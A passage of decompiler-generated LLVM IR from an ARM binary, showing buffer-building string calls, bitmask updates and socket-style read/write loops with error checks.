  %v2_8a5c = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8a68 = add i32 %v2_8a5c, %stack_var_-20860.0.ph
  store i32 %v2_8a68, i32* @r0, align 4
  %v3_8a6c = inttoptr i32 %v2_8a68 to i8*
  %v4_8a6c = call i32 @function_12398(i8* %v3_8a6c, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 %v4_8a6c, i32* %r0.global-to-local, align 4
  store i32 %v6_81f8, i32* %ip.global-to-local, align 4
  %v1_8a74 = load i32, i32* @sb, align 4
  %v3_8a74 = icmp uge i32 %v6_81f8, %v1_8a74
  store i1 %v3_8a74, i1* %cpsr_c.global-to-local, align 1
  %v9_8a74 = icmp eq i32 %v6_81f8, %v1_8a74
  store i1 %v9_8a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8a74, label %dec_label_pc_8b4c, label %dec_label_pc_8a7c

dec_label_pc_8a7c:                                ; preds = %dec_label_pc_8884
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8a80 = call i32 @function_11ad8(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a88 = call i32 @function_12370(i8* %v1_88b8)
  %v0_8a8c = load i32, i32* @sb, align 4
  store i32 %v0_8a8c, i32* %r1.global-to-local, align 4
  store i32 %v2_8a88, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8a98 = inttoptr i32 %v0_8a8c to i32*
  %v3_8a98 = call i32 @function_11a14(i32 35, i32* %v2_8a98)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8a98, i32* %r1.global-to-local, align 4
  %v1_8aa4 = load i32, i32* @r4, align 4
  %v2_8aa4 = add i32 %v1_8aa4, %stack_var_-20860.0.ph
  store i32 %v2_8aa4, i32* @r0, align 4
  %v2_8aa8 = inttoptr i32 %v2_8aa4 to i8*
  %v3_8aa8 = call i32 @function_12398(i8* %v2_8aa8, i32 %v3_8a98)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8ab0 = call i32 @function_11a38(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ab8 = call i32 @function_12370(i8* %v1_88b8)
  %v2_8ac0 = add i32 %v2_8ab8, %stack_var_-20860.0.ph
  store i32 %v2_8ac0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v3_8ac8 = inttoptr i32 %v2_8ac0 to i8*
  %v4_8ac8 = call i32 @function_12398(i8* %v3_8ac8, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ad0 = call i32 @function_12370(i8* %v1_88b8)
  %v0_8ad4 = load i32, i32* @sb, align 4
  store i32 %v0_8ad4, i32* %r1.global-to-local, align 4
  store i32 %v2_8ad0, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8ae0 = inttoptr i32 %v0_8ad4 to i32*
  %v3_8ae0 = call i32 @function_11a14(i32 40, i32* %v2_8ae0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8ae0, i32* %r1.global-to-local, align 4
  %v2_8aec = add i32 %v2_8ad0, %stack_var_-20860.0.ph
  store i32 %v2_8aec, i32* @r0, align 4
  %v2_8af0 = inttoptr i32 %v2_8aec to i8*
  %v3_8af0 = call i32 @function_12398(i8* %v2_8af0, i32 %v3_8ae0)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af8 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197c4.26 to i32), i32* %r1.global-to-local, align 4
  %v2_8b04 = add i32 %v2_8af8, %stack_var_-20860.0.ph
  store i32 %v2_8b04, i32* @r0, align 4
  %v2_8b08 = inttoptr i32 %v2_8b04 to i8*
  %v3_8b08 = call i32 @function_12398(i8* %v2_8b08, i32 ptrtoint (i32* @global_var_197c4.26 to i32))
  store i32 %v6_81f8, i32* %r0.global-to-local, align 4
  %v2_8b10 = call i32 @function_12370(i8* %v1_8b10)
  store i32 %v2_8b10, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b1c = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b28 = add i32 %v2_8b1c, %stack_var_-20860.0.ph
  store i32 %v2_8b28, i32* %r2.global-to-local, align 4
  %v0_8b2c = load i32, i32* @r4, align 4
  store i32 %v0_8b2c, i32* %r0.global-to-local, align 4
  %v3_8b30 = trunc i32 %v0_8b2c to i8
  %v4_8b30 = call i32 @function_12870(i8 %v3_8b30, i32 10, i32 %v2_8b28)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b38 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8b44 = add i32 %v2_8b38, %stack_var_-20860.0.ph
  store i32 %v2_8b44, i32* @r0, align 4
  %v3_8b48 = inttoptr i32 %v2_8b44 to i8*
  %v4_8b48 = call i32 @function_12398(i8* %v3_8b48, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 %v4_8b48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8b4c

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8884, %dec_label_pc_8a7c
  %v0_8b4c = load i32, i32* @r6, align 4
  %v1_8b4c = add i32 %v0_8b4c, 16
  %v2_8b4c = inttoptr i32 %v1_8b4c to i32*
  %v3_8b4c = load i32, i32* %v2_8b4c, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b50 = icmp eq i32 %v3_8b4c, 0
  store i1 %v2_8b50, i1* %cpsr_z.global-to-local, align 1
  %tmp165 = icmp slt i32 %v3_8b4c, 1
  br i1 %tmp165, label %dec_label_pc_8bf8, label %dec_label_pc_8b58

dec_label_pc_8b58:                                ; preds = %dec_label_pc_8b4c
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b5c = call i32 @function_12370(i8* %v1_88b8)
  %v2_8b64 = add i32 %v2_8b5c, %stack_var_-20860.0.ph
  store i32 %v2_8b64, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_197d4.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8b6c = inttoptr i32 %v2_8b64 to i8*
  %v4_8b6c = call i32 @function_12398(i8* %v3_8b6c, i32 ptrtoint ([9 x i8]* @global_var_197d4.34 to i32))
  store i32 %v4_8b6c, i32* %r0.global-to-local, align 4
  %v0_8b70 = load i32, i32* @r6, align 4
  %v1_8b70 = add i32 %v0_8b70, 16
  %v2_8b70 = inttoptr i32 %v1_8b70 to i32*
  %v3_8b70 = load i32, i32* %v2_8b70, align 4
  store i32 %v3_8b70, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8b78 = icmp eq i32 %v3_8b70, 0
  store i1 %v2_8b78, i1* %cpsr_z.global-to-local, align 1
  %v0_8b7c = load i32, i32* @sb, align 4
  store i32 %v0_8b7c, i32* %stack_var_-44, align 4
  %tmp166 = icmp slt i32 %v3_8b70, 1
  br i1 %tmp166, label %dec_label_pc_8be0, label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8b58, %dec_label_pc_8b84
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b88 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_8b90 = load i32, i32* %stack_var_-44, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_8b98 = and i32 %v3_8b90, 33554432
  %v2_8b98 = icmp ne i32 %v1_8b98, 0
  store i1 %v2_8b98, i1* %cpsr_c.global-to-local, align 1
  %v3_8b98 = mul i32 %v3_8b90, 128
  %v1_8b9c = add i32 %v3_8b98, 1472
  %v2_8ba0 = add i32 %v2_8b88, %stack_var_-20860.0.ph
  store i32 %v2_8ba0, i32* @r0, align 4
  %v0_8ba4 = load i32, i32* @r5, align 4
  %v2_8ba4 = add i32 %v1_8b9c, %v0_8ba4
  store i32 %v2_8ba4, i32* %r1.global-to-local, align 4
  %v2_8ba8 = inttoptr i32 %v2_8ba0 to i8*
  %v3_8ba8 = call i32 @function_12398(i8* %v2_8ba8, i32 %v2_8ba4)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bb0 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197e0.36 to i32), i32* %r1.global-to-local, align 4
  %v2_8bbc = add i32 %v2_8bb0, %stack_var_-20860.0.ph
  store i32 %v2_8bbc, i32* @r0, align 4
  %v3_8bc0 = inttoptr i32 %v2_8bbc to i8*
  %v4_8bc0 = call i32 @function_12398(i8* %v3_8bc0, i32 ptrtoint ([3 x i8]* @global_var_197e0.36 to i32))
  store i32 %v4_8bc0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8bc8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8bc8, i32* %r3.global-to-local, align 4
  %v0_8bcc = load i32, i32* @r6, align 4
  %v1_8bcc = add i32 %v0_8bcc, 16
  %v2_8bcc = inttoptr i32 %v1_8bcc to i32*
  %v3_8bcc = load i32, i32* %v2_8bcc, align 4
  store i32 %v3_8bcc, i32* %r2.global-to-local, align 4
  %v1_8bd0 = add i32 %v3_8bc8, 1
  store i32 %v1_8bd0, i32* %ip.global-to-local, align 4
  %v3_8bd4 = icmp uge i32 %v3_8bcc, %v1_8bd0
  store i1 %v3_8bd4, i1* %cpsr_c.global-to-local, align 1
  %v9_8bd4 = icmp eq i32 %v3_8bcc, %v1_8bd0
  store i1 %v9_8bd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8bd0, i32* %stack_var_-44, align 4
  %v8_8bdc = icmp sgt i32 %v3_8bcc, %v1_8bd0
  br i1 %v8_8bdc, label %dec_label_pc_8b84, label %dec_label_pc_8be0

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b84, %dec_label_pc_8b58
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8be4 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8bf0 = add i32 %v2_8be4, %stack_var_-20860.0.ph
  store i32 %v2_8bf0, i32* @r0, align 4
  %v3_8bf4 = inttoptr i32 %v2_8bf0 to i8*
  %v4_8bf4 = call i32 @function_12398(i8* %v3_8bf4, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 %v4_8bf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8bf8

dec_label_pc_8bf8:                                ; preds = %dec_label_pc_8b4c, %dec_label_pc_8be0
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bfc = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* %r1.global-to-local, align 4
  %v2_8c08 = add i32 %v2_8bfc, %stack_var_-20860.0.ph
  store i32 %v2_8c08, i32* @r0, align 4
  %v3_8c0c = inttoptr i32 %v2_8c08 to i8*
  %v4_8c0c = call i32 @function_12398(i8* %v3_8c0c, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32))
  store i32 %v4_8c0c, i32* %r0.global-to-local, align 4
  store i32 %v6_81f8, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_8c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c14, label %dec_label_pc_8c34, label %dec_label_pc_8c1c

dec_label_pc_8c1c:                                ; preds = %dec_label_pc_8bf8
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c20 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v6_81f8, i32* %r1.global-to-local, align 4
  %v2_8c2c = add i32 %v2_8c20, %stack_var_-20860.0.ph
  store i32 %v2_8c2c, i32* @r0, align 4
  %v2_8c30 = inttoptr i32 %v2_8c2c to i8*
  %v3_8c30 = call i32 @function_12398(i8* %v2_8c30, i32 %v6_81f8)
  store i32 %v3_8c30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c34

dec_label_pc_8c34:                                ; preds = %dec_label_pc_8bf8, %dec_label_pc_8c1c
  %v0_8c34 = load i32, i32* @r5, align 4
  %v1_8c34 = add i32 %v0_8c34, 1440
  store i32 %v1_8c34, i32* %r4.global-to-local, align 4
  %v0_8c38 = load i32, i32* @fp, align 4
  store i32 %v0_8c38, i32* %r0.global-to-local, align 4
  store i32 %v1_8c34, i32* %r1.global-to-local, align 4
  %v2_8c40 = inttoptr i32 %v0_8c38 to i8*
  %v3_8c40 = call i32 @function_1275c(i8* %v2_8c40, i32 %v1_8c34)
  store i32 %v3_8c40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8c44 = icmp eq i32 %v3_8c40, 0
  store i1 %v2_8c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8c44, label %dec_label_pc_9710, label %dec_label_pc_8c4c

dec_label_pc_8c4c:                                ; preds = %dec_label_pc_8c34, %dec_label_pc_9710
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_8c50 = load i32, i32* @r6, align 4
  %v1_8c50 = add i32 %v0_8c50, -1452
  %v2_8c50 = inttoptr i32 %v1_8c50 to i32*
  %v3_8c50 = load i32, i32* %v2_8c50, align 4
  store i32 %v3_8c50, i32* @r4, align 4
  %v2_8c54 = call i32 @function_12370(i8* %v1_88b8)
  store i32 %stack_var_-20860.0.ph, i32* @r1, align 4
  store i32 %v2_8c54, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8c64 = load i32, i32* @r4, align 4
  store i32 %v0_8c64, i32* @r0, align 4
  %v4_8c68 = call i32 @function_14ac0(i32 %v0_8c64, i32 %stack_var_-20860.0.ph, i32 %v2_8c54, i32 16384)
  store i32 %v4_8c68, i32* %r0.global-to-local, align 4
  %v0_8c6c = load i32, i32* @r6, align 4
  %v1_8c6c = add i32 %v0_8c6c, -1452
  %v2_8c6c = inttoptr i32 %v1_8c6c to i32*
  %v3_8c6c = load i32, i32* %v2_8c6c, align 4
  store i32 %v3_8c6c, i32* %ip.global-to-local, align 4
  %v3_8c74 = udiv i32 %v3_8c6c, 32
  store i32 %v2_86d8, i32* %r1.global-to-local, align 4
  %v3_8c7c = mul nuw nsw i32 %v3_8c74, 4
  %v2_8c80 = add i32 %v3_8c7c, %v2_86d8
  store i32 %v2_8c80, i32* %r2.global-to-local, align 4
  %v1_8c84 = add i32 %v2_8c80, -164
  %v2_8c84 = inttoptr i32 %v1_8c84 to i32*
  %v3_8c84 = load i32, i32* %v2_8c84, align 4
  %v1_8c8c = urem i32 %v3_8c6c, 32
  store i32 %v1_8c8c, i32* %r0.global-to-local, align 4
  %v7_8c90 = shl i32 1, %v1_8c8c
  %v8_8c90 = or i32 %v3_8c84, %v7_8c90
  store i32 %v8_8c90, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_8c90, i32* %v2_8c84, align 4
  %v0_8c9c = load i32, i32* %r3.global-to-local, align 4
  %v1_8c9c = trunc i32 %v0_8c9c to i8
  %v2_8c9c = load i32, i32* @r6, align 4
  %v3_8c9c = add i32 %v2_8c9c, -1448
  %v4_8c9c = inttoptr i32 %v3_8c9c to i8*
  store i8 %v1_8c9c, i8* %v4_8c9c, align 1
  %v0_8ca0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8ca0 = load i32, i32* @r8, align 4
  %v2_8ca0 = sub i32 %v0_8ca0, %v1_8ca0
  %v3_8ca0 = icmp uge i32 %v0_8ca0, %v1_8ca0
  store i1 %v3_8ca0, i1* %cpsr_c.global-to-local, align 1
  %v4_8ca0 = xor i32 %v1_8ca0, %v0_8ca0
  %v5_8ca0 = xor i32 %v2_8ca0, %v0_8ca0
  %v6_8ca0 = and i32 %v5_8ca0, %v4_8ca0
  %v7_8ca0 = icmp slt i32 %v6_8ca0, 0
  %v8_8ca0 = icmp slt i32 %v2_8ca0, 0
  %v9_8ca0 = icmp eq i32 %v0_8ca0, %v1_8ca0
  store i1 %v9_8ca0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_84f8, i32* %r2.global-to-local, align 4
  %v3_8ca8 = xor i1 %v8_8ca0, %v7_8ca0
  %v4_8ca8 = or i1 %v9_8ca0, %v3_8ca8
  br i1 %v4_8ca8, label %bb168, label %bb167

bb167:                                            ; preds = %dec_label_pc_8c4c
  %v6_8ca8 = add i32 %v0_8ca0, 1
  store i32 %v6_8ca8, i32* @r8, align 4
  br label %bb168

bb168:                                            ; preds = %dec_label_pc_8c4c, %bb167
  %v1_8cac = load i32, i32* @r6, align 4
  %v2_8cac = add i32 %v1_8cac, -1440
  %v3_8cac = inttoptr i32 %v2_8cac to i32*
  store i32 %v2_84f8, i32* %v3_8cac, align 4
  br label %dec_label_pc_85bc

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8574
  %v1_8cb4 = add i32 %v3_8878, -1444
  %v2_8cb4 = inttoptr i32 %v1_8cb4 to i32*
  %v3_8cb4 = load i32, i32* %v2_8cb4, align 4
  store i32 %v2_84f8, i32* %r1.global-to-local, align 4
  %v2_8cbc = sub i32 %v2_84f8, %v3_8cb4
  store i32 %v2_8cbc, i32* %r3.global-to-local, align 4
  %v2_8cc0 = icmp ugt i32 %v2_8cbc, 29
  store i1 %v2_8cc0, i1* %cpsr_c.global-to-local, align 1
  %v7_8cc0 = icmp eq i32 %v2_8cbc, 30
  store i1 %v7_8cc0, i1* %cpsr_z.global-to-local, align 1
  %v2_8cc4 = xor i1 %v7_8cc0, true
  %v3_8cc4 = and i1 %v2_8cc0, %v2_8cc4
  br i1 %v3_8cc4, label %dec_label_pc_85a4, label %dec_label_pc_8cc8

dec_label_pc_8cc8:                                ; preds = %dec_label_pc_8cb4
  %v2_8cc8 = inttoptr i32 %v1_85e0 to i32*
  %v3_8cc8 = load i32, i32* %v2_8cc8, align 4
  store i32 %v3_8cc8, i32* %ip.global-to-local, align 4
  %v3_8cd0 = udiv i32 %v3_8cc8, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8cd4 = mul nuw nsw i32 %v3_8cd0, 4
  store i32 %v3_8cd4, i32* %r2.global-to-local, align 4
  store i32 %v2_86d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_86e0

dec_label_pc_8ce4:                                ; preds = %dec_label_pc_87ac, %dec_label_pc_8d0c
  %v0_8ce4 = call i32 @function_12f18()
  store i32 %v0_8ce4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8cec = inttoptr i32 %v0_8ce4 to i32*
  store i32 0, i32* %v2_8cec, align 4
  store i32 %v2_8278, i32* @r1, align 4
  %v0_8cf4 = load i32, i32* @sl, align 4
  %v1_8cf4 = add i32 %v0_8cf4, -1452
  %v2_8cf4 = inttoptr i32 %v1_8cf4 to i32*
  %v3_8cf4 = load i32, i32* %v2_8cf4, align 4
  store i32 %v3_8cf4, i32* @r0, align 4
  store i32 10240, i32* @r2, align 4
  %v0_8cfc = load i32, i32* %r3.global-to-local, align 4
  %v1_8cfc = add i32 %v0_8cfc, 16384
  store i32 %v1_8cfc, i32* %r3.global-to-local, align 4
  %v4_8d00 = call i32 @function_14a54(i32 %v3_8cf4, i32 %v2_8278, i32 10240, i32 %v1_8cfc)
  store i32 %v4_8d00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d04 = icmp eq i32 %v4_8d00, 0
  store i1 %v2_8d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d04, label %dec_label_pc_9990, label %dec_label_pc_8d0c

dec_label_pc_8d0c:                                ; preds = %dec_label_pc_8ce4
  %v3_8d0c = icmp eq i32 %v4_8d00, -1
  store i1 %v3_8d0c, i1* %cpsr_c.global-to-local, align 1
  %v8_8d0c = icmp eq i32 %v4_8d00, -1
  store i1 %v8_8d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8d0c, label %dec_label_pc_8d14, label %dec_label_pc_8ce4

dec_label_pc_8d14:                                ; preds = %dec_label_pc_8d0c, %dec_label_pc_9990
  %v0_8d14 = call i32 @function_12f18()
  store i32 %v0_8d14, i32* %r0.global-to-local, align 4
  %v1_8d18 = inttoptr i32 %v0_8d14 to i32*
  %v2_8d18 = load i32, i32* %v1_8d18, align 4
  store i32 %v2_8d18, i32* %r3.global-to-local, align 4
  %v2_8d1c = icmp ugt i32 %v2_8d18, 10
  store i1 %v2_8d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d1c = icmp eq i32 %v2_8d18, 11
  store i1 %v7_8d1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d1c, label %dec_label_pc_8d34, label %dec_label_pc_8d24

dec_label_pc_8d24:                                ; preds = %dec_label_pc_8d14
  %v0_8d24 = call i32 @function_12f18()
  store i32 %v0_8d24, i32* %r0.global-to-local, align 4
  %v1_8d28 = inttoptr i32 %v0_8d24 to i32*
  %v2_8d28 = load i32, i32* %v1_8d28, align 4
  store i32 %v2_8d28, i32* %r3.global-to-local, align 4
  %v2_8d2c = icmp ugt i32 %v2_8d28, 10
  store i1 %v2_8d2c, i1* %cpsr_c.global-to-local, align 1
  %v7_8d2c = icmp eq i32 %v2_8d28, 11
  store i1 %v7_8d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d2c, label %dec_label_pc_8d34, label %dec_label_pc_95bc

dec_label_pc_8d34:                                ; preds = %dec_label_pc_8d24, %dec_label_pc_8d14
  %v0_8d34 = load i32, i32* @sl, align 4
  %v1_8d34 = add i32 %v0_8d34, -1448
  %v2_8d34 = inttoptr i32 %v1_8d34 to i8*
  %v3_8d34 = load i8, i8* %v2_8d34, align 1
  %v4_8d34 = zext i8 %v3_8d34 to i32
  store i32 %v4_8d34, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8d38 = icmp eq i8 %v3_8d34, 0
  store i1 %v2_8d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d38, label %dec_label_pc_87b4, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_9694, %dec_label_pc_9ae4, %dec_label_pc_9ac8, %dec_label_pc_96d4, %dec_label_pc_96a4, %dec_label_pc_8d34, %dec_label_pc_9b10, %dec_label_pc_96ec
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8d44 = load i32, i32* @sl, align 4
  %v3_8d44 = add i32 %v2_8d44, -1448
  %v4_8d44 = inttoptr i32 %v3_8d44 to i8*
  store i8 1, i8* %v4_8d44, align 1
  br label %dec_label_pc_87b4

dec_label_pc_8d4c:                                ; preds = %dec_label_pc_8584
  %v2_8d4c = inttoptr i32 %v1_85e0 to i32*
  %v3_8d4c = load i32, i32* %v2_8d4c, align 4
  store i32 %v3_8d4c, i32* %ip.global-to-local, align 4
  %v3_8d54 = udiv i32 %v3_8d4c, 32
  store i32 %v2_86d8, i32* %r3.global-to-local, align 4
  %v3_8d5c = mul nuw nsw i32 %v3_8d54, 4
  %v2_8d60 = add i32 %v3_8d5c, %v2_86d8
  store i32 %v2_8d60, i32* %r2.global-to-local, align 4
  %v1_8d64 = add i32 %v2_8d60, -164
  %v2_8d64 = inttoptr i32 %v1_8d64 to i32*
  %v3_8d64 = load i32, i32* %v2_8d64, align 4
  %v1_8d68 = urem i32 %v3_8d4c, 32
  store i32 %v1_8d68, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8d70 = shl i32 1, %v1_8d68
  %v8_8d70 = or i32 %v3_8d64, %v7_8d70
  store i32 %v8_8d70, i32* %r1.global-to-local, align 4
  %v1_8d74 = load i32, i32* @r8, align 4
  %v2_8d74 = sub i32 %v3_8d4c, %v1_8d74
  %v3_8d74 = icmp uge i32 %v3_8d4c, %v1_8d74
  store i1 %v3_8d74, i1* %cpsr_c.global-to-local, align 1
  %v4_8d74 = xor i32 %v1_8d74, %v3_8d4c
  %v5_8d74 = xor i32 %v2_8d74, %v3_8d4c
  %v6_8d74 = and i32 %v5_8d74, %v4_8d74
  %v7_8d74 = icmp slt i32 %v6_8d74, 0
  %v8_8d74 = icmp slt i32 %v2_8d74, 0
  %v9_8d74 = icmp eq i32 %v3_8d4c, %v1_8d74
  store i1 %v9_8d74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8d70, i32* %v2_8d64, align 4
  %v3_8d7c = xor i1 %v8_8d74, %v7_8d74
  %v4_8d7c = or i1 %v9_8d74, %v3_8d7c
  br i1 %v4_8d7c, label %dec_label_pc_85bc, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d4c
  %v0_8d80 = load i32, i32* %ip.global-to-local, align 4
  %v1_8d80 = load i32, i32* %r3.global-to-local, align 4
  %v2_8d80 = add i32 %v1_8d80, %v0_8d80
  store i32 %v2_8d80, i32* @r8, align 4
  br label %dec_label_pc_8700

dec_label_pc_8d88:                                ; preds = %dec_label_pc_87a4
  %v1_8d88 = add i32 %v0_8798, 660
  %v2_8d88 = inttoptr i32 %v1_8d88 to i32*
  %v3_8d88 = load i32, i32* %v2_8d88, align 4
  store i32 %v3_8d88, i32* %r3.global-to-local, align 4
  %v0_8d8c = load i32, i32* @sb, align 4
  %v2_8d90 = icmp ugt i32 %v3_8d88, 1023
  store i1 %v2_8d90, i1* %cpsr_c.global-to-local, align 1
  %v7_8d90 = icmp eq i32 %v3_8d88, 1024
  store i1 %v7_8d90, i1* %cpsr_z.global-to-local, align 1
  %v1_8d94 = add i32 %v0_8d8c, 2116
  store i32 %v1_8d94, i32* @r7, align 4
  br i1 %v7_8d90, label %dec_label_pc_8e9c, label %dec_label_pc_8d9c

dec_label_pc_8d9c:                                ; preds = %dec_label_pc_8d88, %dec_label_pc_8e9c, %dec_label_pc_8e90
  %v0_8d9c = call i32 @function_12f18()
  store i32 %v0_8d9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8da4 = inttoptr i32 %v0_8d9c to i32*
  store i32 0, i32* %v2_8da4, align 4
  %v0_8da8 = load i32, i32* @sl, align 4
  %v1_8da8 = add i32 %v0_8da8, 660
  %v2_8da8 = inttoptr i32 %v1_8da8 to i32*
  %v3_8da8 = load i32, i32* %v2_8da8, align 4
  store i32 %v3_8da8, i32* %r1.global-to-local, align 4
  %v1_8dac = add i32 %v0_8da8, -1452
  %v2_8dac = inttoptr i32 %v1_8dac to i32*
  %v3_8dac = load i32, i32* %v2_8dac, align 4
  store i32 %v3_8dac, i32* @r0, align 4
  %v1_8db0 = sub i32 1024, %v3_8da8
  store i32 %v1_8db0, i32* @r2, align 4
  %v0_8db4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8db4 = add i32 %v0_8db4, 16384
  store i32 %v1_8db4, i32* %r3.global-to-local, align 4
  %v0_8db8 = load i32, i32* @r7, align 4
  %v2_8db8 = add i32 %v0_8db8, %v3_8da8
  store i32 %v2_8db8, i32* @r1, align 4
  %v4_8dbc = call i32 @function_14a54(i32 %v3_8dac, i32 %v2_8db8, i32 %v1_8db0, i32 %v1_8db4)
  store i32 %v4_8dbc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8dc0 = icmp eq i32 %v4_8dbc, 0
  store i1 %v2_8dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8dc0, label %dec_label_pc_9590, label %dec_label_pc_8dc8

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d9c
  %v2_8dc8 = icmp eq i32 %v4_8dbc, -1
  store i1 %v2_8dc8, i1* %cpsr_c.global-to-local, align 1
  %v7_8dc8 = icmp eq i32 %v4_8dbc, -1
  store i1 %v7_8dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8dc8, label %dec_label_pc_959c, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8dc8
  %v0_8dd0 = load i32, i32* @sl, align 4
  %v1_8dd0 = add i32 %v0_8dd0, 660
  %v2_8dd0 = inttoptr i32 %v1_8dd0 to i32*
